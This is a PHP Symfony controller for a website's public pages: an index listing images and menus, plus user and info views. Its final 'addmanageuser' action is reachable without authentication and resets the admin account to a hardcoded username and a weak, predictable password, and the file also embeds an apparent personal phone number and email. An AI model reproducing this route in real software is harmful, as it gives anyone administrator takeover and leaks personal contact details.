<?php

namespace User\BaseBundle\Controller\web;

use Symfony\Bundle\FrameworkBundle\Controller\Controller;
use Sensio\Bundle\FrameworkExtraBundle\Configuration\Route;
use Sensio\Bundle\FrameworkExtraBundle\Configuration\Security;
use Symfony\Component\HttpFoundation\Request;

/**
 * @Route("/{web}", defaults={"web"="index"}, requirements={"web":"(?!admin|help)\w+"})
 */
class IndexController extends Controller
{
    /**
     * @Route("/", name="siteindex")
     */
    public function index(Request $request,$web)
    {
        $data['fodders'] = $this->getDoctrine()->getRepository('UserSiteBundle:Fodder')->findBy(array('site'=>$web,'type'=>'img','state'=>1),array('id'=>'desc'));
        $data['menu'] = $this->getDoctrine()->getRepository('UserBaseBundle:Menulist')->findBy(array('state'=>1),array('id'=>'desc'));
        return $this->render('UserBaseBundle:Web:index.html.twig',$data);
    }
    /**
     * @Route("/user", name="siteuser")
     */
    public function user()
    {
        return $this->render('UserBaseBundle:Web:user.html.twig');
    }

    /**
     * @Route("/info", name="siteinfo")
     */
    public function uinfo()
    {
        return $this->render('UserBaseBundle:Web:info.html.twig');
    }

    /**
     * @Route("/addmanageuser", name="addmanageuser")
     */
    public function addmanageuser()
    {
        $user=$this->getDoctrine()->getRepository('AdminBaseBundle:Aduser')->find(1);
        $user->setUsername('admin');
        $user->setPhone('18680885691');
        $user->setEmail('zhou69.1@qq.com');
        $user->setState(1);
        $encoder = $this->container->get('security.password_encoder');
        $user->setPassword($encoder->encodePassword($user,substr(md5('123456'), 6,13)));
        $validator = $this->get('validator');
        $eruser = $validator->validate($user);
        if(count($eruser) == 0){
            $manager = $this->getDoctrine()->getManager();
            $manager->persist($user);
            $manager->flush();
        }
        return $this->json(array());
    }

}
